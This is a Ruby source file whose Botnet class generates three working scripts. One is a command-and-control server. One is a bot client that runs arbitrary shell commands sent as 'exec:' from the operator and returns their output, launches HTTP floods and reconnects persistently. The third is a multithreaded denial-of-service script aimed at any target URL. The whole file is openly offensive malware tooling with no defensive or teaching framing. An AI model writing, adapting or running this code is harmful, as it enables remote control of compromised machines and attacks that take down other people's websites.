require 'socket'
require 'json'
require_relative '../utils/colorize'

class Botnet
  def self.generate_botnet_server(port = 5555)
    server = <<~RUBY
      require 'socket'
      require 'json'
      require 'thread'
      
      port = #{port}
      bots = {}
      mutex = Mutex.new
      
      server = TCPServer.new(port)
      puts "Botnet C&C server listening on port #{port}"
      
      loop do
        Thread.start(server.accept) do |client|
          bot_id = nil
          
          begin
            bot_id = client.gets.chomp
            mutex.synchronize do
              bots[bot_id] = {
                ip: client.peeraddr[2],
                port: client.peeraddr[1],
                connected: Time.now,
                last_seen: Time.now
              }
            end
            puts "Bot connected: #{bot_id} (#{client.peeraddr[2]}:#{client.peeraddr[1]})"
            
            loop do
              command = client.gets.chomp
              
              if command == 'list'
                mutex.synchronize do
                  list = bots.map { |id, info| "#{id}: #{info[:ip]}:#{info[:port]}" }.join("\\n")
                  client.puts list
                end
              elsif command.start_with?('exec:')
                cmd = command.split('exec:')[1]
                mutex.synchronize do
                  bots.each do |id, info|
                    info[:command] = cmd
                  end
                end
                client.puts "Command broadcasted"
              elsif command.start_with?('ddos:')
                target = command.split('ddos:')[1]
                mutex.synchronize do
                  bots.each do |id, info|
                    info[:ddos_target] = target
                  end
                end
                client.puts "DDoS started on #{target}"
              elsif command == 'status'
                mutex.synchronize do
                  status = {
                    total_bots: bots.length,
                    bots: bots.keys
                  }
                  client.puts JSON.generate(status)
                end
              elsif command == 'exit'
                mutex.synchronize do
                  bots.delete(bot_id)
                end
                client.close
                break
              else
                client.puts "Unknown command"
              end
            end
          rescue => e
            mutex.synchronize do
              bots.delete(bot_id) if bot_id
            end
            client.close
          end
        end
      end
    RUBY
    
    filename = "botnet_server_#{Time.now.to_i}.rb"
    File.write(filename, server)
    puts Colorize.green("Botnet server saved: #{filename}")
    filename
  end

  def self.generate_botnet_client(server_ip, server_port = 5555)
    client = <<~RUBY
      require 'socket'
      require 'json'
      require 'securerandom'
      require 'net/http'
      require 'uri'
      
      server_ip = '#{server_ip}'
      server_port = #{server_port}
      bot_id = SecureRandom.hex(8)
      
      def ddos_attack(target, duration = 60)
        uri = URI(target)
        threads = []
        
        duration.times do
          10.times do
            Thread.new do
              begin
                http = Net::HTTP.new(uri.host, uri.port)
                http.use_ssl = uri.scheme == 'https'
                req = Net::HTTP::Get.new(uri.path)
                http.request(req)
              rescue
              end
            end
          end
          sleep(1)
        end
      end
      
      loop do
        begin
          socket = TCPSocket.new(server_ip, server_port)
          socket.puts(bot_id)
          
          loop do
            command = socket.gets.chomp
            
            if command == 'exit'
              socket.close
              exit
            elsif command.start_with?('exec:')
              cmd = command.split('exec:')[1]
              result = `#{cmd} 2>&1`
              socket.puts(result)
            elsif command.start_with?('ddos:')
              target = command.split('ddos:')[1]
              Thread.new { ddos_attack(target) }
              socket.puts("DDoS started on #{target}")
            else
              socket.puts("Unknown command")
            end
          end
        rescue => e
          sleep(10)
          retry
        end
      end
    RUBY
    
    filename = "botnet_client_#{Time.now.to_i}.rb"
    File.write(filename, client)
    puts Colorize.green("Botnet client saved: #{filename}")
    filename
  end

  def self.generate_ddos_script(target_url, threads = 100, duration = 60)
    script = <<~RUBY
      require 'net/http'
      require 'uri'
      require 'thread'
      
      target = '#{target_url}'
      threads_count = #{threads}
      duration = #{duration}
      
      uri = URI(target)
      mutex = Mutex.new
      requests = 0
      errors = 0
      
      start_time = Time.now
      
      threads = []
      threads_count.times do
        threads << Thread.new do
          loop do
            break if Time.now - start_time > duration
            
            begin
              http = Net::HTTP.new(uri.host, uri.port)
              http.use_ssl = uri.scheme == 'https'
              http.read_timeout = 1
              
              req = Net::HTTP::Get.new(uri.path)
              res = http.request(req)
              
              mutex.synchronize do
                requests += 1
                puts "Requests: #{requests}, Errors: #{errors}" if requests % 100 == 0
              end
            rescue => e
              mutex.synchronize do
                errors += 1
              end
            end
          end
        end
      end
      
      threads.each(&:join)
      puts "Total requests: #{requests}, Errors: #{errors}"
    RUBY
    
    filename = "ddos_#{Time.now.to_i}.rb"
    File.write(filename, script)
    puts Colorize.green("DDoS script saved: #{filename}")
    filename
  end
end

